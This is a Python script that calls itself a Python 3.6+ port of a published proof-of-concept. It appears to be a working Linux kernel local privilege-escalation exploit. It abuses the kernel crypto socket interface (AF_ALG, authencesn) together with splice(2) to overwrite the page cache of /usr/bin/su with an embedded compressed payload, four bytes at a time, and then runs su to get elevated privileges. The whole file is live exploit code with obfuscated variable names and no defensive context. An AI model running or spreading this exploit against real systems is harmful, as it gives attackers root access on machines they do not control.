#!/usr/bin/env python3
# Compat version of Theori's PoC: works on Python 3.6+ (the original needs 3.10+).
# Functionally identical — only difference is splice(2) is called via ctypes
# instead of os.splice.
import os, zlib, socket, ctypes

_libc = ctypes.CDLL(None, use_errno=True)
_splice = _libc.splice
_splice.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
                    ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
                    ctypes.c_size_t, ctypes.c_uint]
_splice.restype = ctypes.c_ssize_t

def _splice_compat(src, dst, count, offset_src=None, offset_dst=None, flags=0):
    p_src = ctypes.byref(ctypes.c_int64(offset_src)) if offset_src is not None else None
    p_dst = ctypes.byref(ctypes.c_int64(offset_dst)) if offset_dst is not None else None
    r = _splice(src, p_src, dst, p_dst, count, flags)
    if r < 0:
        err = ctypes.get_errno()
        raise OSError(err, os.strerror(err))
    return r

if not hasattr(os, "splice"):
    os.splice = _splice_compat

g = os
s = socket

def d(x):
    return bytes.fromhex(x)

def c(f, t, payload):
    a = s.socket(38, 5, 0)
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    h = 279
    v = a.setsockopt
    v(h, 1, d('0800010000000010' + '0' * 64))
    v(h, 5, None, 4)
    u, _ = a.accept()
    o = t + 4
    i = d('00')
    u.sendmsg(
        [b"A" * 4 + payload],
        [(h, 3, i * 4), (h, 2, b'\x10' + i * 19), (h, 4, b'\x08' + i * 3)],
        32768,
    )
    r, w = g.pipe()
    g.splice(f, w, o, offset_src=0)
    g.splice(r, u.fileno(), o)
    try:
        u.recv(8 + t)
    except Exception:
        pass

f = g.open("/usr/bin/su", 0)
i = 0
e = zlib.decompress(d(
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d"
    "209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675"
    "c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
))
while i < len(e):
    c(f, i, e[i:i + 4])
    i += 4
g.system("su")
